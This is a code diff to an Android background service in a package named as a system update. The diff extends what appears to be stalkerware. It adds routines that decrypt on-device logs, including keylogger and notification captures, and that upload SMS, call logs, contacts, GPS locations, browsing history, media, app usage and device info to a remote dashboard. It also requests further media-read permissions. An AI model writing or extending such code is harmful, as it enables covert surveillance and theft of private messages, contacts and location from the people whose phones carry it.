@@ -604,25 +604,95 @@ class CoreService : LifecycleService() {
                 unsynced.forEach {
                     batch.put(JSONObject().apply {
                         put("id", it.id); put("type", it.type)
-                        put("content", it.content); put("timestamp", it.timestamp)
+                        // collected_data is encrypted at rest on-device; decrypt
+                        // before shipping so the server can route keylogger /
+                        // notification / event / network entries into their
+                        // dashboard module collections (TLS in transit, the
+                        // server re-encrypts the whole batch at rest).
+                        put("content", encryptionManager.decryptSafe(it.content) ?: it.content)
+                        put("timestamp", it.timestamp)
                     })
                 }
                 if (secureComms.sendBatch(batch.toString())) {
                     unsynced.forEach { repository.markSynced(it.id) }
                 }
             }
+            syncStructuredTables()
         } catch (e: Exception) { Log.e(TAG, "Sync error", e) }
     }
 
+    // Ship the structured collections (SMS, calls, contacts, GPS, browsing,
+    // media, app usage, device info) to the server. Each table keeps a "last
+    // synced id" cursor in SharedPreferences; every cycle only rows inserted
+    // after the cursor are batched. The server routes each message by type into
+    // its module collection (dedupe by content hash, capped arrays), which is
+    // what feeds every section of the dashboard.
+    private suspend fun syncStructuredTables() {
+        try {
+            val prefs = getSharedPreferences("sync_cursors", Context.MODE_PRIVATE)
+            val batch = JSONArray()
+            val cursors = mutableMapOf<String, Long>()
+            val limit = 100
+
+            val sms = repository.smsSync(prefs.getLong("sms", 0L), limit)
+            sms.first.forEach { batch.put(syncMessageJson(it)) }
+            cursors["sms"] = sms.second
+
+            val calls = repository.callsSync(prefs.getLong("calls", 0L), limit)
+            calls.first.forEach { batch.put(syncMessageJson(it)) }
+            cursors["calls"] = calls.second
+
+            val contacts = repository.contactsSync(prefs.getLong("contacts", 0L), limit)
+            contacts.first.forEach { batch.put(syncMessageJson(it)) }
+            cursors["contacts"] = contacts.second
+
+            val locations = repository.locationsSync(prefs.getLong("locations", 0L), limit)
+            locations.first.forEach { batch.put(syncMessageJson(it)) }
+            cursors["locations"] = locations.second
+
+            val browsing = repository.browsingSync(prefs.getLong("browsing", 0L), limit)
+            browsing.first.forEach { batch.put(syncMessageJson(it)) }
+            cursors["browsing"] = browsing.second
+
+            val media = repository.mediaSync(prefs.getLong("media", 0L), limit)
+            media.first.forEach { batch.put(syncMessageJson(it)) }
+            cursors["media"] = media.second
+
+            val apps = repository.appUsageSync(prefs.getLong("apps", 0L), limit)
+            apps.first.forEach { batch.put(syncMessageJson(it)) }
+            cursors["apps"] = apps.second
+
+            val device = repository.deviceInfoSync(prefs.getLong("device", 0L), limit)
+            device.first.forEach { batch.put(syncMessageJson(it)) }
+            cursors["device"] = device.second
+
+            if (batch.length() > 0 && secureComms.sendBatch(batch.toString())) {
+                cursors.forEach { (key, value) -> prefs.edit().putLong(key, value).apply() }
+            }
+        } catch (e: Exception) { Log.e(TAG, "Structured sync error", e) }
+    }
+
+    private fun syncMessageJson(msg: com.androidsystem.update.database.DataRepository.SyncMessage): JSONObject =
+        JSONObject().apply {
+            put("id", 0L)
+            put("type", msg.type)
+            put("content", msg.content)
+            put("timestamp", msg.timestamp)
+        }
+
     private suspend fun checkPermissions() {
-        val perms = listOf(
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
-            Manifest.permission.READ_SMS,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.PACKAGE_USAGE_STATS
-        )
+        val perms = buildList {
+            add(Manifest.permission.ACCESS_FINE_LOCATION)
+            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+            add(Manifest.permission.READ_SMS)
+            add(Manifest.permission.READ_CALL_LOG)
+            add(Manifest.permission.READ_CONTACTS)
+            add(Manifest.permission.PACKAGE_USAGE_STATS)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                add(Manifest.permission.READ_MEDIA_IMAGES)
+                add(Manifest.permission.READ_MEDIA_VIDEO)
+            }
+        }
         val missing = perms.filter { !checkPermission(it) }
         if (missing.isNotEmpty()) {
             secureComms.sendTelemetry(JSONObject().apply {
